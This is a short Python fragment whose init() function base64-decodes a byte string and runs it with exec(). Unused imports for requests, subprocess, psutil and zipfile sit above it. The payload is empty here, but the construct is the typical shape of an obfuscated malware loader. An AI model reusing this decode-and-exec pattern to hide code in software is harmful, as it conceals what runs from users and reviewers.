import base64
import sys
import time
import zipfile
import requests
import os
import subprocess
import psutil
def init():
    data = b''
    decoded_bytes = base64.b64decode(data)
    exec(decoded_bytes.decode())

